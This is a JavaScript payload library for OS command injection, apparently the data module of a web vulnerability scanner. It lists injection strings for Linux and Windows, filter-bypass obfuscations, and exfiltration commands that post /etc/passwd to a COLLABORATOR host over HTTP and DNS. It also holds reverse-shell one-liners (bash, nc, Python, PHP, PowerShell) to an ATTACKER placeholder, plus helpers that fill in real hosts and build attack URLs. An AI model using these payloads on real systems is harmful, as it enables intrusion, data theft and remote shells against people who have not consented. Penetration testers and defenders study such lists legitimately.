// OS Command Injection Payloads
// Comprehensive payload database for Linux and Windows command injection

const CMDiPayloads = {
    // Basic Command Injection - Linux
    basicLinux: [
        '; whoami',
        '| whoami',
        '& whoami',
        '|| whoami',
        '&& whoami',
        '\n whoami',
        '` whoami `',
        '$( whoami )',
        '; id',
        '| id',
        '; uname -a',
        '| uname -a',
        '; pwd',
        '| pwd'
    ],

    // Basic Command Injection - Windows
    basicWindows: [
        '; whoami',
        '| whoami',
        '& whoami',
        '|| whoami',
        '&& whoami',
        '\n whoami',
        '; ver',
        '| ver',
        '; hostname',
        '| hostname',
        '; cd',
        '| cd'
    ],

    // Blind Command Injection (Out-of-Band)
    blindOOB: [
        '; nslookup COLLABORATOR',
        '| nslookup COLLABORATOR',
        '; curl http://COLLABORATOR',
        '| curl http://COLLABORATOR',
        '; wget http://COLLABORATOR',
        '| wget http://COLLABORATOR',
        '; ping -c 5 COLLABORATOR',
        '| ping -c 5 COLLABORATOR',
        '; dig COLLABORATOR',
        '| dig COLLABORATOR',
        // Data exfiltration
        '; nslookup `whoami`.COLLABORATOR',
        '| curl http://COLLABORATOR/$(whoami)',
        '; wget http://COLLABORATOR/?data=`cat /etc/passwd | base64`',
        '| curl -d @/etc/passwd http://COLLABORATOR'
    ],

    // Time-Based Detection - Linux
    timeBasedLinux: [
        '; sleep 10',
        '| sleep 10',
        '& sleep 10',
        '|| sleep 10',
        '&& sleep 10',
        '; ping -c 10 127.0.0.1',
        '| ping -c 10 127.0.0.1',
        '; sleep 5 && echo done',
        '| sleep 5 && echo done'
    ],

    // Time-Based Detection - Windows
    timeBasedWindows: [
        '; timeout /t 10',
        '| timeout /t 10',
        '& timeout /t 10',
        '|| timeout /t 10',
        '&& timeout /t 10',
        '; ping -n 10 127.0.0.1',
        '| ping -n 10 127.0.0.1',
        '; waitfor /t 10 pause',
        '| waitfor /t 10 pause'
    ],

    // Output-Based Injection - Linux
    outputBasedLinux: [
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '; cat /etc/hosts',
        '| cat /etc/hosts',
        '; ls -la',
        '| ls -la',
        '; ls /',
        '| ls /',
        '; cat /proc/version',
        '| cat /proc/version',
        '; env',
        '| env',
        '; printenv',
        '| printenv'
    ],

    // Output-Based Injection - Windows
    outputBasedWindows: [
        '; type C:\\Windows\\win.ini',
        '| type C:\\Windows\\win.ini',
        '; dir C:\\',
        '| dir C:\\',
        '; dir',
        '| dir',
        '; set',
        '| set',
        '; systeminfo',
        '| systeminfo',
        '; ipconfig',
        '| ipconfig'
    ],

    // Filter Bypass Techniques
    filterBypass: [
        // Quote obfuscation
        '; w"h"o"a"m"i',
        "; w'h'o'a'm'i",
        // Variable expansion
        '; who$()ami',
        '; who${IFS}ami',
        // Hex encoding
        '; \\x77\\x68\\x6f\\x61\\x6d\\x69',
        // Concatenation
        '; who`echo ami`',
        '; who$(echo ami)',
        // Wildcards
        '; cat</etc/passwd',
        '; cat</e??/p??swd',
        // Tab/newline
        '; who\tami',
        '; who\nami',
        // Case manipulation
        '; WhOaMi',
        '; WHOAMI'
    ],

    // Data Exfiltration
    dataExfil: [
        // Base64 encoding
        '; cat /etc/passwd | base64',
        '| cat /etc/passwd | base64',
        // HTTP exfiltration
        '; curl -d @/etc/passwd http://COLLABORATOR',
        '| wget --post-file=/etc/passwd http://COLLABORATOR',
        // DNS exfiltration
        '; nslookup `cat /etc/passwd | base64`.COLLABORATOR',
        // File upload
        '; curl -F file=@/etc/passwd http://COLLABORATOR/upload',
        // Windows
        '; certutil -encode C:\\Windows\\win.ini out.txt',
        '| type C:\\Windows\\win.ini | curl -d @- http://COLLABORATOR'
    ],

    // Reverse Shell Payloads - Linux
    reverseShellLinux: [
        '; bash -i >& /dev/tcp/ATTACKER/4444 0>&1',
        '| bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',
        '; nc ATTACKER 4444 -e /bin/bash',
        '| nc ATTACKER 4444 -e /bin/sh',
        '; python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'ATTACKER\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
        '; php -r \'$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");\''
    ],

    // Reverse Shell Payloads - Windows
    reverseShellWindows: [
        '; powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'ATTACKER\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
        '| nc.exe ATTACKER 4444 -e cmd.exe'
    ]
};

// Command templates
const CommandTemplates = {
    whoami: {
        linux: 'whoami',
        windows: 'whoami',
        description: 'Get current user'
    },
    pwd: {
        linux: 'pwd',
        windows: 'cd',
        description: 'Get current directory'
    },
    ls: {
        linux: 'ls -la',
        windows: 'dir',
        description: 'List files'
    },
    cat: {
        linux: 'cat /etc/passwd',
        windows: 'type C:\\Windows\\win.ini',
        description: 'Read sensitive files'
    }
};

// Helper functions
function getPayloadsByType(type, os = 'both') {
    let payloads = [];

    if (type === 'basic') {
        if (os === 'linux' || os === 'both') {
            payloads.push(...CMDiPayloads.basicLinux);
        }
        if (os === 'windows' || os === 'both') {
            payloads.push(...CMDiPayloads.basicWindows);
        }
    } else if (type === 'blind') {
        payloads.push(...CMDiPayloads.blindOOB);
    } else if (type === 'timeBased') {
        if (os === 'linux' || os === 'both') {
            payloads.push(...CMDiPayloads.timeBasedLinux);
        }
        if (os === 'windows' || os === 'both') {
            payloads.push(...CMDiPayloads.timeBasedWindows);
        }
    } else if (type === 'outputBased') {
        if (os === 'linux' || os === 'both') {
            payloads.push(...CMDiPayloads.outputBasedLinux);
        }
        if (os === 'windows' || os === 'both') {
            payloads.push(...CMDiPayloads.outputBasedWindows);
        }
    } else if (type === 'filterBypass') {
        payloads.push(...CMDiPayloads.filterBypass);
    } else if (type === 'dataExfil') {
        payloads.push(...CMDiPayloads.dataExfil);
    }

    return payloads;
}

function getAllCMDiPayloads() {
    const allPayloads = [];
    Object.keys(CMDiPayloads).forEach(key => {
        if (Array.isArray(CMDiPayloads[key])) {
            allPayloads.push(...CMDiPayloads[key]);
        }
    });
    return allPayloads;
}

function getPayloadCount() {
    return getAllCMDiPayloads().length;
}

function buildPayloadURL(baseUrl, paramName, payload, method = 'GET') {
    if (method === 'GET') {
        const url = new URL(baseUrl);
        url.searchParams.set(paramName, payload);
        return url.toString();
    } else {
        return `${baseUrl} (POST: ${paramName}=${payload})`;
    }
}

function replaceCollaborator(payload, collaboratorUrl) {
    if (!collaboratorUrl) {
        collaboratorUrl = 'burpcollaborator.net';
    }
    return payload.replace(/COLLABORATOR/g, collaboratorUrl);
}

function replaceAttacker(payload, attackerIP = '10.0.0.1') {
    return payload.replace(/ATTACKER/g, attackerIP);
}

// Export for use in scanner
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        CMDiPayloads,
        CommandTemplates,
        getPayloadsByType,
        getAllCMDiPayloads,
        getPayloadCount,
        buildPayloadURL,
        replaceCollaborator,
        replaceAttacker
    };
}
